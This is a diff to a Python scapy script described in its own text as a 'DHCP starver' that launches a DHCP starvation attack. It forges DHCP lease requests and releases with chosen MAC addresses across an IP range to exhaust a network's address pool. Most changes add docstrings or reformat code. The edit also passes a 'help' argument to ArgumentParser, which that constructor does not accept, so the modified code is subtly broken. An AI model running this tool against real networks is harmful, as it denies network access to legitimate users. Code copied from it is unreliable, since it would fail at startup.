@@ -9,6 +9,9 @@ import scapy.layers.dhcp
 
 
 def request(interface, ip, mac, lease_time):
+    """
+    Request a DHCP lease
+    """
     pkt = (
         Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
         / IP(src="0.0.0.0", dst="255.255.255.255")
@@ -25,23 +28,25 @@ def request(interface, ip, mac, lease_time):
     )
     scapy.sendrecv.sendp(pkt, iface=interface, verbose=False)
 
+
 def release(interface, ip, mac):
+    """
+    Release a DHCP lease
+    """
     pkt = (
         Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
         / IP(src="0.0.0.0", dst="255.255.255.255")
         / UDP(sport=68, dport=67)
         / BOOTP(chaddr=mac, ciaddr=ip)
-        / DHCP(
-            options=[
-                ("message-type", "release"),
-                "end",
-            ]
-        )
+        / DHCP(options=[("message-type", "release"), "end",])
     )
     scapy.sendrecv.sendp(pkt, iface=interface, verbose=False)
 
 
 def sniff(pkt):
+    """
+    Sniff DHCP packet and print them to stdout
+    """
     if DHCP not in pkt:
         return
     options_dict = {op[0]: op[1] for op in pkt[DHCP].options if isinstance(op, tuple)}
@@ -59,6 +64,9 @@ def sniff(pkt):
 
 
 def ip_range(start, end):
+    """
+    Generator for IP ranges, use as ip_range('192.168.0.0', '192.168.0.255')
+    """
     start = ipaddress.IPv4Address(start)
     end = ipaddress.IPv4Address(end)
     for ip in range(int(start), int(end) + 1):
@@ -66,7 +74,9 @@ def ip_range(start, end):
 
 
 def main():
-    parser = ArgumentParser(description="DHCP starver")
+    parser = ArgumentParser(
+        description="DHCP starver", help="Launch a DHCP starvation attack"
+    )
     parser.add_argument("--interface", default="eth0")
     parser.add_argument(
         "--pool-start",
@@ -102,7 +112,7 @@ def main():
         print("Graceful shutdown")
         for ip, mac in pool:
             release(args.interface, ip, mac)
-            time.sleep(.5)
+            time.sleep(0.5)
     except Exception as e:
         print(e)
     finally:
